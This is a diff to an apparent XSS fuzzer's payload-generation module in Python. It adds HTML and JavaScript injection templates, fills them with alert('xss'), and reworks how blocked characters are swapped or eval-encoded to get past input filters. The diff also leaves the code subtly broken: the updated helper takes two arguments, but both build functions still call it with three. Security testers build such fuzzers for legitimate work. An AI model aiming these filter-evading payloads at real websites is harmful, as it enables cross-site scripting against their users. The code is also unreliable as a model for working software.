@@ -20,6 +20,10 @@ BASE_PAYLOADS = {
     ],
     "INJECT_HTML": [
         {
+            "payload": """<zboub>FUNCTION("ARGS")</zboub>""",
+            "used_chars": ['<', '>', '(', ')', '"', '/', 'FUNCTION', 'ARGS']
+        },
+        {
             "payload": """<script>FUNCTION("ARGS")</script>""",
             "used_chars": ['<', '>', '(', ')', '"', '/', 'FUNCTION', 'ARGS']
         },
@@ -52,30 +56,10 @@ TEST_INPUT = "ABCDEFGHb3liottHGFEDCBA"
 def replace_list_element(l: list, old: str, new: str) -> list: l[l.index(old)] = new
 
 
-
-def next_payload(attackType: AttackType, lastTestedPayload: Payload) -> Payload:
-
-    if attackType == AttackType.ESCAPE_JS and lastTestedPayload.referredIndex < len(BASE_PAYLOADS['ESCAPE_JS'])-1:
-        newIndex = lastTestedPayload.referredIndex+1
-        return BASE_PAYLOADS['ESCAPE_JS'][newIndex], newIndex
-    
-    elif attackType == AttackType.INJECT_HTML and lastTestedPayload.referredIndex < len(BASE_PAYLOADS['INJECT_HTML'])-1:
-        newIndex = lastTestedPayload.referredIndex+1
-        return BASE_PAYLOADS['INJECT_HTML'][newIndex], newIndex
-    
-    else:
-        return None, None
-
-
-def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list, attackType: AttackType) -> Payload:
+def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list) -> Payload | None:
     """
     Updates the payload by replacing the failed data with the next possible value
     """
-    usedCharsReplaced = lastTestedPayload.usedCharsReplaced
-    if len(failedData) == 0:
-            # if there is no failed data, it means that the last tested payload was in the response but didn't trigger the alert
-            # so we need to try the next payload
-            return next_payload(attackType, lastTestedPayload)
 
     # replace the failed data with the next possible value
     toRemove = []
@@ -91,7 +75,7 @@ def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list
             toRemove.append(data)
 
         elif data['type'] == "ARGS":
-            if usedCharsReplaced.__contains__('eval'):
+            if lastTestedPayload.usedCharsReplaced.__contains__('eval'):
                 args = lastTestedPayload.usedCharsReplaced[lastTestedPayload.usedChars.index('ARGS')]
                 func = lastTestedPayload.usedCharsReplaced[lastTestedPayload.usedChars.index('FUNCTION')]
                 toEncode = f"{func}({args})"
@@ -110,16 +94,15 @@ def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list
                     break
         
         if newChar is None:
-            raise Exception("No more equivalent character available")
+            return
         
         # remove old failed functions and args
         for data in toRemove: failedData.remove(data)
         
-        payload_str = lastTestedPayload.value.replace(data['value'], newChar)
-        replace_list_element(usedCharsReplaced, data['value'], newChar)
+        lastTestedPayload.value = lastTestedPayload.value.replace(data['value'], newChar)
+        replace_list_element(lastTestedPayload.usedCharsReplaced, data['value'], newChar)
 
-
-    return payload_str, lastTestedPayload.referredIndex
+    return lastTestedPayload
     
 
 
@@ -129,13 +112,14 @@ def build_ESCAPE_JS_payload(requestModel: RequestModel, filterModel: FilterModel
     """
     # TODO: be able to choose ALERT or REQUEST_BIN in the building process
 
-    if lastTestedPayload is None:
+    payloadType = PayloadType.ALERT # TODO: change this
+
+    if len(failedData) == 0:
         # take the first payload which has the expected escape char
         for base_payload in BASE_PAYLOADS["ESCAPE_JS"]: 
             if base_payload['used_chars'][0] == requestModel.escapeChar: payload = base_payload;break
 
         payload_str = f"{TEST_INPUT}{payload['payload']}"
-        newIndex = 0
 
         # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
         payload_str = payload_str.replace("FUNCTION", "alert")
@@ -147,15 +131,9 @@ def build_ESCAPE_JS_payload(requestModel: RequestModel, filterModel: FilterModel
         payload_str = payload_str.replace("ARGS", "xss")
         replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
 
-    else:
-        payload_str, newIndex = update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.attackType)
+        return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=0)
 
-        if payload_str is None:
-            # no more payloads available, so we return None to stop the fuzzing process
-            return
-
-    payloadType = PayloadType.ALERT # TODO: change this
-    return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=newIndex)
+    return update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.attackType)
 
 
 
@@ -168,10 +146,16 @@ def build_INJECT_HTML_payload(requestModel: RequestModel, filterModel: FilterMod
     # we first try to inject a script tag
     # if it is filtered, we try to inject other tags like img or svg which can also execute js code
 
-    if lastTestedPayload is None:
-        payload = BASE_PAYLOADS['INJECT_HTML'][0]
+    payloadType = PayloadType.ALERT # TODO: change this
+
+    if len(failedData) == 0:
+        if lastTestedPayload is None:
+            newIndex = 0
+        else:
+            newIndex = lastTestedPayload.referredIndex+1
+
+        payload = BASE_PAYLOADS['INJECT_HTML'][newIndex]
         payload_str = f"{TEST_INPUT}{payload['payload']}"
-        newIndex = 0
 
         # TODO: generate payloads for alert and fetch 
         payload_str = payload_str.replace("FUNCTION", "alert")
@@ -183,17 +167,9 @@ def build_INJECT_HTML_payload(requestModel: RequestModel, filterModel: FilterMod
         payload_str = payload_str.replace("ARGS", "xss")
         replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
 
-    else:
-        payload_str, newIndex = update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.attackType)
+        return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=newIndex)
 
-        if payload_str is None:
-            # no more payloads available, so we return None to stop the fuzzing process
-            return
-
-
-    payloadType = PayloadType.ALERT # TODO: remove
-    return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=newIndex)
-
+    return update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.attackType)
 
 
 def get_payload_generator(attackType: AttackType) -> callable:
